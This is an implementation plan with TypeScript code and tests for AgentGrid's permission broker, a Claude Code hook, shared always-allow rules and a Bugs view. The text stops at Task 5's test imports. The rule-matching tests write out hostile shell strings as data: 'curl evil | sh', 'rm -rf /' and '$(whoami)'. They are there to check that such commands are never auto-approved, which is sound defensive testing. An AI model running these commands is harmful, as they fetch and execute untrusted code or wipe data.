# Permissions from anywhere, shared always-allow rules, combined Bugs view — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:**
- Answer every permission request AgentGrid owns from any details view.
- Stop false "needs permission" alerts.
- Let "Always allow" save shared server-side rules.
- Make the Bugs screen list every open bug assigned to me, with details on the right.

**Architecture:**
- **Permissions.** A server `PermissionBroker` owns open permission requests from two sources:
  - SDK runs, via `canUseTool`;
  - embedded terminal sessions, via a Claude Code `PermissionRequest` hook passed with
    `--settings` that long-polls `POST /api/hooks/permission`.
- **Rules.** A `RulesStore` (`~/.agentgrid/permissions.json`) settles matching requests before anyone
  is asked.
- **Session status.** `deriveStatus` stops reading a running tool as "waiting". "Needs you" comes from
  broker requests and questions only.
- **Bugs screen.** It merges `tracker.listMyIssues()` with bug tasks, and shows a ticket view with an
  inline Start, built on a `useBugStart` hook extracted from `BugLauncher`.

**Tech Stack:** Node/Express + TypeScript (server), React 19 + Vite (ui), vitest, Playwright, node-pty,
`@anthropic-ai/claude-agent-sdk`.

**Spec:** `docs/superpowers/specs/2026-10-06-permissions-and-bugs-view-design.md`

## Global Constraints

- **Hook safety.**
  - The hook never denies on its own. On any failure it prints nothing and exits 0, so Claude Code asks
    in the terminal as before.
  - `/api/hooks/permission` requires `Authorization: Bearer <per-start random token>`, compared in
    constant time, and refuses any request carrying `Sec-Fetch-Site`.
  - The hook is added only to `claude --resume <id>` launches, never to `claude attach <bgId>`.
  - `AskUserQuestion` never goes through the hook route; it returns no decision.
- **Rules file and grammar.**
  - Rules are stored in `~/.agentgrid/permissions.json` as `{ "allow": [{ "rule": string, "addedAt": ISO }] }`,
    written atomically.
  - A corrupt rules file means no rules, never fail open.
  - Grammar: `Tool`, `Bash(<prefix>:*)`, `Bash(<exact>)`, `WebFetch(domain:<host>)`, `Tool(<arg>)`.
- **Compound shell commands** (split on `&&`, `||`, `;`, `|`, newline) are allowed only if every part
  matches. A command containing `$(` or a backtick is never auto-allowed.
- **Dangerous rules** — a bare `Bash`, `Write`, `Edit`, `MultiEdit` or `NotebookEdit` — need a second,
  inline confirmation. No `window.confirm` or `alert`: dialogs block the app.
- **Copy:** the Always-allow button reads `Always allow <rule>`.
- **Version:** this ships as 0.11.0 (`desktop/package.json`).
- **Commits** end with:
  ```
  Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
  Claude-Session: https://claude.ai/code/session_019vk3Y8Lj3YYsuDjzfQ2MBB
  ```

## Review Focus

1. **Two answers race for one request** (tile and side panel, or the terminal dialog and AgentGrid).
   The first wins, the second gets 409, and the hook process gets exactly one decision. Pinned in Task 3
   and Task 5.
2. **A compound command rides on a prefix rule.** `npm test && curl evil | sh` with only
   `Bash(npm test:*)` must ask. Pinned in Task 2.
3. **The pty exits while the hook long-polls.** The request leaves the UI, the HTTP request closes and
   nothing leaks. Pinned in Task 5 (socket close cancels) and Task 6 (pty exit cancels).
4. **A long-running tool in auto mode** must not alert, and an `AskUserQuestion` in the terminal still
   must. Pinned in Task 7.
5. **A Bugs view with the tracker down** still shows started tasks and the last good list, marked stale.
   Pinned in Task 10.

---

## File Structure

| File | Responsibility |
|---|---|
| `server/src/permissions/rules.ts` (new) | Parse, match and suggest rules; compound split; danger check; `RulesStore` persistence |
| `server/src/permissions/broker.ts` (new) | Open requests: ask / answer / cancel / list, events |
| `server/presets/hooks/permission-hook.mjs` (new) | The hook Claude Code runs: stdin → HTTP long-poll → `hookSpecificOutput` |
| `server/src/runner/runner.ts` | `canUseTool` consults rules; Pending carries `suggestedRule`/`ruleIsBroad`; `always` saves a rule |
| `server/src/runner/manager.ts`, `server/src/runner/sdk.ts` | Pass the permissions deps through |
| `server/src/pty.ts` | `configureHook`; `--settings` for `--resume`; an exit listener |
| `server/src/api/app.ts` | Hook route; answer routing; rules routes; `GET /api/bugfix/issues/:key` |
| `server/src/sessionStatus.ts`, `server/src/types.ts` | `runningTool` replaces `pendingTool`; new types and events |
| `server/src/store/store.ts`, `server/src/start.ts` | `permissions` in state; wiring after listen |
| `ui/src/state/reducer.ts`, `ui/src/state/attention.ts` | Permission requests in state; "needs you" from them |
| `ui/src/components/PendingPrompt.tsx` | One card: Allow / `Always allow <rule>` (confirm when broad) / Deny |
| `ui/src/components/AgentTile.tsx`, `SidePanel.tsx`, `BugScreen.tsx` | Show the card for broker and SDK requests |
| `ui/src/components/SettingsDialog.tsx` | "Always allowed" section |
| `ui/src/hooks/useBugStart.ts` (new) | Repo / preflight / base / start / start-anyway logic shared by the launcher and the ticket view |
| `ui/src/components/TicketDetail.tsx` (new) | An unstarted ticket plus the inline Start panel |
| `ui/src/hooks/useHashRoute.ts` | `#/bugs/ticket/<KEY>` |

---

### Task 1: Spike — does the PermissionRequest hook behave as the spec assumes?

Throwaway. Nothing here is committed except the ledger note.

**Files:**
- Create: `<scratchpad>/hookspike/hook.mjs`, `<scratchpad>/hookspike/spike.mjs` (outside the repo)

**Interfaces:**
- Produces a ledger line: `Task 1: Ruling: mechanism = PermissionRequest-hook | Notification+keys — <evidence>`.

- [ ] **Step 1: Write a hook that logs and waits.** It appends its stdin to a log file. If the file
  `<dir>/answer` exists, it prints `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`.
  Otherwise it polls for that file every 200 ms, for up to 20 s, then exits 0 silently.

```js
// hook.mjs
import { appendFileSync, existsSync } from "node:fs";
const dir = process.env.SPIKE_DIR;
const chunks = []; for await (const c of process.stdin) chunks.push(c);
appendFileSync(`${dir}/hook.log`, Buffer.concat(chunks).toString() + "\n---\n");
const t0 = Date.now();
while (Date.now() - t0 < 20000) {
  if (existsSync(`${dir}/answer`)) { process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } })); process.exit(0); }
  await new Promise(r => setTimeout(r, 200));
}
process.exit(0);
```

- [ ] **Step 2: Drive a real `claude` in a pty** (node-pty from `server/node_modules`, cwd = the repo,
  which is trusted):
  `claude --model haiku --permission-mode default --settings '{"hooks":{"PermissionRequest":[{"matcher":"*","hooks":[{"type":"command","command":"node <dir>/hook.mjs","timeout":60}]}]}}'`.
  Prompt: "Run the shell command `date` with Bash and tell me the output", followed by a separate `\r`.
  Wait 15 s. Record:
  - (a) whether `hook.log` got a `tool_name: "Bash"` entry, and its fields;
  - (b) what the screen shows while the hook waits (dialog visible or not);
  - (c) after `touch <dir>/answer`, whether the command ran without any keypress.
- [ ] **Step 3: Repeat with `--permission-mode acceptEdits`** and a prompt that writes a file (an edit
  auto-approved by mode). Record whether the hook fired. Expected: not fired.
- [ ] **Step 4: Repeat Step 2, but press `1` + Enter in the terminal** while the hook waits. Record
  whether the terminal answer settles the request, and whether the hook's later output is ignored.
- [ ] **Step 5: Rule.**
  - If (a) fired, (c) ran without a keypress, and Step 3 did not fire: keep the hook mechanism.
  - Otherwise, write the fallback ruling (a `Notification` hook with matcher `permission_prompt`, and
    answers typed into the pty as `1`/`2`/`3` then Enter, via `PtyManager.submit`-style split writes).
    Adjust Tasks 5–6 accordingly; the broker and UI do not change.

  Ledger: `Task 1: Ruling: …`. If Step 4 shows a terminal answer does not cancel the hook: the broker
  must also cancel a request when the session's log shows that `tool_use` got a `tool_result`. Add that
  to Task 7 as an extra step, and record the ruling.

---

### Task 2: Rules — grammar, matching, suggestions, storage

**Files:**
- Create: `server/src/permissions/rules.ts`
- Test: `server/test/permissions/rules.test.ts`

**Interfaces:**
- Produces:
  ```ts
  export function splitCommand(cmd: string): string[] | null;      // null: contains $( or ` — never auto-allow
  export function matchesRule(rule: string, toolName: string, input: Record<string, unknown>): boolean;
  export function allowedByRules(rules: string[], toolName: string, input: Record<string, unknown>): boolean;
  export function suggestRule(toolName: string, input: Record<string, unknown>, suggestions: unknown[]): string;
  export function isBroadRule(rule: string): boolean;
  export function isValidRule(rule: string): boolean;
  export interface SavedRule { rule: string; addedAt: string }
  export class RulesStore {
    constructor(home: string);
    load(): Promise<void>;            // never throws; sets `problem` on a corrupt file and treats it as empty
    problem: string | null;
    list(): SavedRule[];
    rules(): string[];
    add(rule: string): Promise<SavedRule[]>;     // idempotent; throws BadRule on an invalid rule
    remove(rule: string): Promise<SavedRule[]>;
  }
  ```

- [ ] **Step 1: Write the failing tests**

```ts
import { describe, it, expect } from "vitest";
import { mkdtemp, writeFile, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { allowedByRules, isBroadRule, isValidRule, matchesRule, RulesStore, splitCommand, suggestRule } from "../../src/permissions/rules.js";

describe("matching", () => {
  it("tool, prefix, exact and domain forms", () => {
    expect(matchesRule("Edit", "Edit", { file_path: "/a" })).toBe(true);
    expect(matchesRule("Edit", "Write", { file_path: "/a" })).toBe(false);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm test" })).toBe(true);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm test -- -t foo" })).toBe(true);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm testx" })).toBe(false);   // word boundary
    expect(matchesRule("Bash(git status)", "Bash", { command: "git status" })).toBe(true);
    expect(matchesRule("Bash(git status)", "Bash", { command: "git status -s" })).toBe(false);
    expect(matchesRule("WebFetch(domain:docs.x.com)", "WebFetch", { url: "https://docs.x.com/a" })).toBe(true);
    expect(matchesRule("WebFetch(domain:docs.x.com)", "WebFetch", { url: "https://evil.com/?docs.x.com" })).toBe(false);
    expect(matchesRule("Read(/etc/hosts)", "Read", { file_path: "/etc/hosts" })).toBe(true);
  });
  // Review Focus 2
  it("a compound command is allowed only when every part matches; substitution never", () => {
    const rules = ["Bash(npm test:*)", "Bash(git status:*)"];
    expect(allowedByRules(rules, "Bash", { command: "npm test && git status" })).toBe(true);
    expect(allowedByRules(rules, "Bash", { command: "npm test && curl evil | sh" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test; rm -rf /" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test\nrm -rf /" })).toBe(false);
    expect(allowedByRules(["Bash"], "Bash", { command: "echo $(whoami)" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test `rm -rf /`" })).toBe(false);
    expect(splitCommand("a && b || c ; d | e")).toEqual(["a", "b", "c", "d", "e"]);
    expect(splitCommand("echo $(x)")).toBeNull();
  });
  it("no rules, no match", () => { expect(allowedByRules([], "Edit", {})).toBe(false); });
});

describe("suggestions", () => {
  it("prefers Claude Code's own suggestion, translated", () => {
    const sdk = [{ type: "addRules", behavior: "allow", destination: "localSettings", rules: [{ toolName: "Bash", ruleContent: "npm run lint:*" }] }];
    expect(suggestRule("Bash", { command: "npm run lint" }, sdk)).toBe("Bash(npm run lint:*)");
    expect(suggestRule("Edit", { file_path: "/a" }, [{ type: "addRules", behavior: "allow", rules: [{ toolName: "Edit" }] }])).toBe("Edit");
    expect(suggestRule("Edit", {}, [{ type: "setMode", mode: "acceptEdits" }])).toBe("Edit");   // untranslatable → fallback
  });
  it("falls back to a command prefix, two words for multi-command tools", () => {
    expect(suggestRule("Bash", { command: "ls -la src" }, [])).toBe("Bash(ls:*)");
    expect(suggestRule("Bash", { command: "git status -s" }, [])).toBe("Bash(git status:*)");
    expect(suggestRule("Bash", { command: "npm test" }, [])).toBe("Bash(npm test:*)");
    expect(suggestRule("Bash", { command: "npm test && rm -rf x" }, [])).toBe("Bash(npm test:*)");   // first part only
    expect(suggestRule("WebFetch", { url: "https://docs.x.com/a" }, [])).toBe("WebFetch(domain:docs.x.com)");
    expect(suggestRule("Write", { file_path: "/a" }, [])).toBe("Write");
  });
  it("broad and invalid rules", () => {
    for (const r of ["Bash", "Write", "Edit", "MultiEdit", "NotebookEdit"]) expect(isBroadRule(r)).toBe(true);
    expect(isBroadRule("Bash(ls:*)")).toBe(false); expect(isBroadRule("Read")).toBe(false);
    expect(isValidRule("Bash(ls:*)")).toBe(true); expect(isValidRule("")).toBe(false); expect(isValidRule("Bash(")).toBe(false); expect(isValidRule("bash")).toBe(false);
  });
});

describe("RulesStore", () => {
  it("adds once, removes, persists", async () => {
    const home = await mkdtemp(path.join(tmpdir(), "rules-"));
    const s = new RulesStore(home); await s.load();
    await s.add("Bash(ls:*)"); await s.add("Bash(ls:*)"); await s.add("Edit");
    expect(s.rules()).toEqual(["Bash(ls:*)", "Edit"]);
    await s.remove("Edit");
    const again = new RulesStore(home); await again.load();
    expect(again.rules()).toEqual(["Bash(ls:*)"]);
    expect(JSON.parse(await readFile(path.join(home, "permissions.json"), "utf8")).allow[0]).toMatchObject({ rule: "Bash(ls:*)", addedAt: expect.any(String) });
    await expect(s.add("Bash(")).rejects.toThrow(/not a valid rule/);
  });
  it("a corrupt file means no rules and a stated problem — never fail open", async () => {
    const home = await mkdtemp(path.join(tmpdir(), "rules-"));
    await writeFile(path.join(home, "permissions.json"), "{nope");
    const s = new RulesStore(home); await s.load();
    expect(s.rules()).toEqual([]); expect(s.problem).toMatch(/permissions\.json/);
  });
});
```

- [ ] **Step 2: Run it.** Command: `cd server && npx vitest run test/permissions/rules.test.ts`.
  Expected: FAIL, cannot find module `rules.js`.
- [ ] **Step 3: Implement**

```ts
import { readFile, mkdir } from "node:fs/promises";
import path from "node:path";
import { writeAtomic } from "../store/atomic.js";   // if absent, use the store's own atomic writer — see note
import { BadRequest } from "../store/store.js";

const RULE = /^([A-Z][A-Za-z0-9_]*)(?:\((.+)\))?$/;
const MULTI = new Set(["npm", "git", "yarn", "pnpm", "docker", "kubectl", "gh", "npx", "cargo", "go"]);
const BROAD = new Set(["Bash", "Write", "Edit", "MultiEdit", "NotebookEdit"]);

export function isValidRule(rule: string): boolean { return RULE.test(rule.trim()); }
export function isBroadRule(rule: string): boolean { return BROAD.has(rule.trim()); }

/** Parts of a shell command, split on && || ; | and newlines. Null when it substitutes a command. */
export function splitCommand(cmd: string): string[] | null {
  if (/\$\(|`/.test(cmd)) return null;
  return cmd.split(/&&|\|\||;|\||\n/).map(p => p.trim()).filter(Boolean);
}

const argOf = (input: Record<string, unknown>): string | null => {
  for (const k of ["file_path", "url", "pattern", "notebook_path", "path"]) if (typeof input[k] === "string") return input[k] as string;
  return null;
};
const hostOf = (url: unknown): string | null => { try { return new URL(String(url)).hostname; } catch { return null; } };

function matchesOne(rule: string, toolName: string, input: Record<string, unknown>, command?: string): boolean {
  const m = RULE.exec(rule.trim());
  if (!m || m[1] !== toolName) return false;
  const content = m[2];
  if (content === undefined) return true;
  if (toolName === "Bash") {
    const cmd = (command ?? String(input.command ?? "")).trim();
    if (content.endsWith(":*")) { const prefix = content.slice(0, -2).trim(); return cmd === prefix || cmd.startsWith(prefix + " "); }
    return cmd === content.trim();
  }
  if (content.startsWith("domain:")) return hostOf(input.url) === content.slice("domain:".length);
  return argOf(input) === content;
}

export function matchesRule(rule: string, toolName: string, input: Record<string, unknown>): boolean {
  return matchesOne(rule, toolName, input);
}

export function allowedByRules(rules: string[], toolName: string, input: Record<string, unknown>): boolean {
  if (!rules.length) return false;
  if (toolName === "Bash") {
    const parts = splitCommand(String(input.command ?? ""));
    if (!parts || !parts.length) return false;
    return parts.every(p => rules.some(r => matchesOne(r, "Bash", input, p)));
  }
  return rules.some(r => matchesOne(r, toolName, input));
}

/** What "Always allow" saves: Claude Code's own suggestion when it translates, else a sensible default. */
export function suggestRule(toolName: string, input: Record<string, unknown>, suggestions: unknown[]): string {
  for (const s of suggestions as Array<{ type?: string; behavior?: string; rules?: Array<{ toolName?: string; ruleContent?: string }> }>) {
    if (s?.type !== "addRules" || (s.behavior && s.behavior !== "allow")) continue;
    const r = s.rules?.find(x => x?.toolName === toolName);
    if (r) { const rule = r.ruleContent ? `${toolName}(${r.ruleContent})` : toolName; if (isValidRule(rule)) return rule; }
  }
  if (toolName === "Bash") {
    const first = splitCommand(String(input.command ?? ""))?.[0] ?? "";
    const words = first.split(/\s+/).filter(Boolean);
    if (!words.length) return "Bash";
    const prefix = MULTI.has(words[0]) && words[1] && !words[1].startsWith("-") ? `${words[0]} ${words[1]}` : words[0];
    return `Bash(${prefix}:*)`;
  }
  if (toolName === "WebFetch") { const h = hostOf(input.url); if (h) return `WebFetch(domain:${h})`; }
  return toolName;
}

export interface SavedRule { rule: string; addedAt: string }

/** Shared always-allow rules, kept by the server for every agent, bug fix and embedded session. */
export class RulesStore {
  private items: SavedRule[] = [];
  problem: string | null = null;
  private file: string;
  constructor(home: string) { this.file = path.join(home, "permissions.json"); }
  async load(): Promise<void> {
    const raw = await readFile(this.file, "utf8").catch(() => null);
    if (raw === null) { this.items = []; this.problem = null; return; }
    try {
      const allow = JSON.parse(raw)?.allow;
      if (!Array.isArray(allow)) throw new Error("no allow list");
      this.items = allow.filter((x: SavedRule) => typeof x?.rule === "string" && isValidRule(x.rule));
      this.problem = null;
    } catch (e) {
      this.items = []; this.problem = `permissions.json could not be read (${(e as Error).message}); nothing is auto-allowed until it is fixed or a rule is saved`;
    }
  }
  list(): SavedRule[] { return [...this.items]; }
  rules(): string[] { return this.items.map(i => i.rule); }
  async add(rule: string): Promise<SavedRule[]> {
    const r = rule.trim();
    if (!isValidRule(r)) throw new BadRequest(`"${rule}" is not a valid rule`);
    if (!this.items.some(i => i.rule === r)) { this.items.push({ rule: r, addedAt: new Date().toISOString() }); await this.save(); }
    return this.list();
  }
  async remove(rule: string): Promise<SavedRule[]> { this.items = this.items.filter(i => i.rule !== rule); await this.save(); return this.list(); }
  private async save(): Promise<void> {
    await mkdir(path.dirname(this.file), { recursive: true });
    await writeAtomic(this.file, { allow: this.items });
    this.problem = null;
  }
}
```

  Note: use the store's existing atomic writer. Run `grep -rn "export async function writeAtomic\|function writeAtomic" server/src`
  and import it from wherever it lives. If it is not exported, export it from that module. Do not write
  a second implementation. `BadRequest` is exported from `server/src/store/store.ts` next to `Conflict`;
  if not, use the one `app.ts` imports.

- [ ] **Step 4: Run it.** Same command. Expected: PASS (all).
- [ ] **Step 5: Commit**

```bash
git add server/src/permissions/rules.ts server/test/permissions/rules.test.ts
git commit -m "feat(server): always-allow rules — grammar, compound-safe matching, suggestions, storage"
```

---

### Task 3: PermissionBroker

**Files:**
- Create: `server/src/permissions/broker.ts`
- Modify: `server/src/types.ts` (types and events), `server/src/store/store.ts` (`permissions` in `getState`)
- Test: `server/test/permissions/broker.test.ts`

**Interfaces:**
- Consumes: `RulesStore`, `allowedByRules`, `suggestRule`, `isBroadRule` (Task 2).
- Produces (in `types.ts`):
  ```ts
  export interface PermissionRequest {
    id: string; agentId: string; source: "sdk" | "terminal"; sessionId: string | null;
    toolName: string; input: Record<string, unknown>; suggestedRule: string; ruleIsBroad: boolean; createdAt: string;
  }
  // GridEvent gains:
  | { type: "permission"; request: PermissionRequest }
  | { type: "permission-settled"; id: string }
  // GridState gains: permissions: PermissionRequest[]
  ```
  And in `broker.ts`:
  ```ts
  export type BrokerDecision = { behavior: "allow" } | { behavior: "deny"; message: string };
  export class PermissionBroker extends EventEmitter {        // emits "event" with GridEvent
    constructor(rules: RulesStore);
    allowed(toolName: string, input: Record<string, unknown>): boolean;
    ask(req: { agentId: string; source: "terminal"; sessionId: string; toolName: string; input: Record<string, unknown>; suggestions: unknown[] }): { id: string; decision: Promise<BrokerDecision | null> };
    answer(id: string, decision: Decision): Promise<void>;   // Conflict if unknown/settled; "always" → rules.add then allow; "answers" → BadRequest
    cancel(id: string): void;                                  // settles with null
    cancelSession(sessionId: string): void;
    has(id: string): boolean;
    list(): PermissionRequest[];
  }
  ```

- [ ] **Step 1: Write the failing tests**

```ts
import { describe, it, expect, beforeEach } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { PermissionBroker } from "../../src/permissions/broker.js";
import { RulesStore } from "../../src/permissions/rules.js";

let rules: RulesStore; let broker: PermissionBroker; let events: any[];
beforeEach(async () => {
  rules = new RulesStore(await mkdtemp(path.join(tmpdir(), "brk-"))); await rules.load();
  broker = new PermissionBroker(rules); events = []; broker.on("event", e => events.push(e));
});
const req = (command = "npm test") => ({ agentId: "rev@r", source: "terminal" as const, sessionId: "s1", toolName: "Bash", input: { command }, suggestions: [] });

describe("PermissionBroker", () => {
  it("records a request, announces it, and settles it once", async () => {
    const { id, decision } = broker.ask(req());
    expect(broker.list()).toEqual([expect.objectContaining({ id, agentId: "rev@r", toolName: "Bash", suggestedRule: "Bash(npm test:*)", ruleIsBroad: false })]);
    expect(events[0]).toMatchObject({ type: "permission", request: { id } });
    await broker.answer(id, { kind: "allow" });
    expect(await decision).toEqual({ behavior: "allow" });
    expect(broker.list()).toEqual([]);
    expect(events.at(-1)).toEqual({ type: "permission-settled", id });
    // Review Focus 1: the second answer loses
    await expect(broker.answer(id, { kind: "deny" })).rejects.toMatchObject({ status: 409 });
  });
  it("deny carries a message; answers are not a permission decision", async () => {
    const a = broker.ask(req()); await broker.answer(a.id, { kind: "deny" });
    expect(await a.decision).toEqual({ behavior: "deny", message: "Denied in AgentGrid" });
    const b = broker.ask(req()); await expect(broker.answer(b.id, { kind: "answers", answers: {} })).rejects.toMatchObject({ status: 400 });
  });
  it("always saves the suggested rule, and later matching requests are allowed without asking", async () => {
    const a = broker.ask(req("npm test -- -t x")); await broker.answer(a.id, { kind: "always" });
    expect(await a.decision).toEqual({ behavior: "allow" });
    expect(rules.rules()).toEqual(["Bash(npm test:*)"]);
    expect(broker.allowed("Bash", { command: "npm test" })).toBe(true);
    expect(broker.allowed("Bash", { command: "npm test && rm -rf /" })).toBe(false);
  });
  it("cancel and cancelSession settle with null and drop the request", async () => {
    const a = broker.ask(req()); const b = broker.ask({ ...req(), sessionId: "s2" });
    broker.cancelSession("s1");
    expect(await a.decision).toBeNull(); expect(broker.list().map(r => r.id)).toEqual([b.id]);
    broker.cancel(b.id); expect(await b.decision).toBeNull(); expect(broker.list()).toEqual([]);
  });
});
```

- [ ] **Step 2: Run it.** Command: `cd server && npx vitest run test/permissions/broker.test.ts`.
  Expected: FAIL, module not found.
- [ ] **Step 3: Implement** the types in `types.ts` (exactly as in Interfaces). `broker.ts`:

```ts
import { EventEmitter } from "node:events";
import { Conflict, BadRequest } from "../store/store.js";
import { allowedByRules, isBroadRule, suggestRule, type RulesStore } from "./rules.js";
import type { Decision, GridEvent, PermissionRequest } from "../types.js";

export type BrokerDecision = { behavior: "allow" } | { behavior: "deny"; message: string };
interface Open { req: PermissionRequest; resolve: (d: BrokerDecision | null) => void }

/** Every open permission request AgentGrid answers for an embedded terminal session; settles each exactly once. */
export class PermissionBroker extends EventEmitter {
  private open = new Map<string, Open>();
  private next = 1;
  constructor(private rules: RulesStore) { super(); }

  allowed(toolName: string, input: Record<string, unknown>): boolean { return allowedByRules(this.rules.rules(), toolName, input); }

  ask(r: { agentId: string; source: "terminal"; sessionId: string; toolName: string; input: Record<string, unknown>; suggestions: unknown[] }) {
    const suggestedRule = suggestRule(r.toolName, r.input, r.suggestions);
    const req: PermissionRequest = { id: `pr${this.next++}`, agentId: r.agentId, source: r.source, sessionId: r.sessionId, toolName: r.toolName,
      input: r.input, suggestedRule, ruleIsBroad: isBroadRule(suggestedRule), createdAt: new Date().toISOString() };
    const decision = new Promise<BrokerDecision | null>(resolve => this.open.set(req.id, { req, resolve }));
    this.emit("event", { type: "permission", request: req } satisfies GridEvent);
    return { id: req.id, decision };
  }

  async answer(id: string, d: Decision): Promise<void> {
    const o = this.open.get(id);
    if (!o) throw new Conflict(`permission request ${id} is already settled`);
    if (d.kind === "answers") throw new BadRequest("a permission request takes allow, always or deny");
    if (d.kind === "always") await this.rules.add(o.req.suggestedRule);
    this.settle(id, d.kind === "deny" ? { behavior: "deny", message: d.message ?? "Denied in AgentGrid" } : { behavior: "allow" });
  }

  cancel(id: string): void { if (this.open.has(id)) this.settle(id, null); }
  cancelSession(sessionId: string): void { for (const [id, o] of this.open) if (o.req.sessionId === sessionId) this.settle(id, null); }
  has(id: string): boolean { return this.open.has(id); }
  list(): PermissionRequest[] { return [...this.open.values()].map(o => o.req); }

  private settle(id: string, d: BrokerDecision | null): void {
    const o = this.open.get(id); if (!o) return;
    this.open.delete(id);
    o.resolve(d);
    this.emit("event", { type: "permission-settled", id } satisfies GridEvent);
  }
}
```

  In `store.ts`, add `permissions: () => PermissionRequest[] = () => []`, next to `bugTasks`, and
  include `permissions: this.permissions()` in `getState()`.

- [ ] **Step 4: Run it, plus a typecheck.** Commands: `cd server && npx vitest run test/permissions && npx tsc --noEmit -p .`.
  Expected: PASS; tsc clean.
- [ ] **Step 5: Commit** with the message
  `feat(server): permission broker — one place that holds and settles open requests`.

---

### Task 4: SDK runs consult the rules; Always allow saves a rule

**Files:**
- Modify: `server/src/types.ts` (Pending gains `suggestedRule: string; ruleIsBroad: boolean`),
  `server/src/runner/runner.ts`, `server/src/runner/manager.ts`
- Test: `server/test/runner.test.ts` (append)

**Interfaces:**
- Consumes: `RulesStore`, `allowedByRules`, `suggestRule`, `isBroadRule`.
- Produces: `new Manager(store, { queryFn?, buildOptions?, rules?: RulesStore })`.
  - The Runner's deps gain `rules?: RulesStore`.
  - `canUseTool`: when the tool is not `AskUserQuestion` and the rules allow it, it resolves
    `{ behavior: "allow" }` immediately, with no Pending.
  - `answer(..., {kind:"always"})`: `await rules.add(pending.suggestedRule)`, then allow without
    `updatedPermissions`. The server owns rules now, so the SDK never writes the project's local
    settings.

- [ ] **Step 1: Write the failing tests** (append to `server/test/runner.test.ts`; reuse its existing
  fake-query harness, i.e. its `makeFakeQuery`, a store in a temp home, and `until`):

```ts
describe("Runner and always-allow rules", () => {
  it("a request a rule allows never waits on anyone", async () => {
    const rules = new RulesStore(home); await rules.load(); await rules.add("Bash(npm test:*)");
    const m = new Manager(store, { queryFn: fake.queryFn, buildOptions: (_r, a, e) => { canUseTool = e.canUseTool; return { cwd: a.repo, abortController: e.abortController } as Options; }, rules });
    const ag = await store.createAgent({ role: "coder", repo: "/x" }); await m.assign(ag.id, "go");
    const r = await canUseTool!("Bash", { command: "npm test" }, { signal: new AbortController().signal, toolUseID: "t1", suggestions: [] } as any);
    expect(r).toEqual({ behavior: "allow", updatedInput: { command: "npm test" } });
    expect(store.getAssignment(store.getAgent(ag.id).currentAssignmentId!).pending).toBeNull();
  });
  it("a parked request carries the rule Always allow would save; Always allow saves it", async () => {
    const rules = new RulesStore(home); await rules.load();
    const m = new Manager(store, { queryFn: fake.queryFn, buildOptions: (_r, a, e) => { canUseTool = e.canUseTool; return { cwd: a.repo, abortController: e.abortController } as Options; }, rules });
    const ag = await store.createAgent({ role: "coder", repo: "/x" }); await m.assign(ag.id, "go");
    const p = canUseTool!("Bash", { command: "git status -s" }, { signal: new AbortController().signal, toolUseID: "t2", suggestions: [] } as any);
    await until(() => store.getAgent(ag.id).state === "waiting");
    expect(store.getAssignment(store.getAgent(ag.id).currentAssignmentId!).pending).toMatchObject({ suggestedRule: "Bash(git status:*)", ruleIsBroad: false });
    await m.answer(ag.id, "t2", { kind: "always" });
    expect(await p).toEqual({ behavior: "allow", updatedInput: { command: "git status -s" } });
    expect(rules.rules()).toEqual(["Bash(git status:*)"]);
  });
});
```

  The SDK's `PermissionResult` allow requires `updatedInput` in current SDK types. If the existing
  runner returns `{ behavior: "allow" }` without it and the tests elsewhere expect that, keep the
  existing shape, adjust these two expectations to match, and record a ruling.

- [ ] **Step 2: Run it.** Command: `cd server && npx vitest run test/runner.test.ts -t "always-allow"`.
  Expected: FAIL (the `rules` option is ignored; there is no `suggestedRule`).
- [ ] **Step 3: Implement.**
  - In `canUseTool`, before building the Pending:
    `if (toolName !== "AskUserQuestion" && this.deps.rules && allowedByRules(this.deps.rules.rules(), toolName, input)) return Promise.resolve({ behavior: "allow", updatedInput: input });`.
  - Build the Pending with `suggestedRule = suggestRule(toolName, input, opts.suggestions ?? [])` and
    `ruleIsBroad = isBroadRule(suggestedRule)`. Questions get `suggestedRule: ""` and
    `ruleIsBroad: false`.
  - In `answer`, `case "always"`: `if (this.deps.rules) await this.deps.rules.add(pending.suggestedRule); result = { behavior: "allow" };`.
    The `rules.add` must sit inside the existing `try` so the `finally` still resolves the SDK on a
    write error.
  - Thread `rules` through `Manager` → `Runner`.
- [ ] **Step 4: Run the whole server suite.** Command: `cd server && npx vitest run > /tmp/x.log 2>&1; tail -5 /tmp/x.log`.
  Expected: all pass. Existing tests that construct a `Pending` literal need the two new fields; add
  them.
- [ ] **Step 5: Commit** with the message
  `feat(server): SDK runs honour always-allow rules; Always allow saves a shared rule`.

---

### Task 5: The hook route and the hook script

**Files:**
- Create: `server/presets/hooks/permission-hook.mjs`
- Modify: `server/src/api/app.ts`
- Test: `server/test/permissions/hook.test.ts`

**Interfaces:**
- Consumes: `PermissionBroker` (Task 3).
- Produces:
  - `AppDeps` gains:
    - `permissions?: { broker: PermissionBroker; rules: RulesStore }`;
    - `hookToken?: () => string | null`;
    - `agentForSession?: (sessionId: string) => string | null`.
  - `POST /api/hooks/permission` → `200 { decision: BrokerDecision | null }`.
  - `POST /api/agents/:id/answer` routes ids the broker `has()` to `broker.answer`. The broker answer
    must belong to that agent, otherwise 404.

- [ ] **Step 1: Write the failing tests**

```ts
import { describe, it, expect, beforeEach } from "vitest";
import request from "supertest";
import http from "node:http";
import { execFile } from "node:child_process";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { Store } from "../../src/store/store.js";
import { Manager } from "../../src/runner/manager.js";
import { createApp } from "../../src/api/app.js";
import { PermissionBroker } from "../../src/permissions/broker.js";
import { RulesStore } from "../../src/permissions/rules.js";
import { makeFakeQuery } from "../helpers/fakeQuery.js";
